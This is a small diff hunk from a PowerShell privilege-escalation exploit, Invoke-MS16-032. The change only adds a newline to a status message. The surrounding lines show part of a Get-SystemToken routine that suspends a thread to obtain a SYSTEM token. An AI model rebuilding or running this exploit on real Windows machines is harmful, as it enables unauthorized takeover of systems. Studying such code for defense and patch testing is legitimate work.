@@ -207,7 +207,7 @@ function Invoke-MS16-032 {
 	}
 	
 	function Get-SystemToken {
-		echo "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"
+		echo "`n[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"
 	
 		$CallResult = [Kernel32]::SuspendThread($hThread)
 		if ($CallResult -ne 0) {
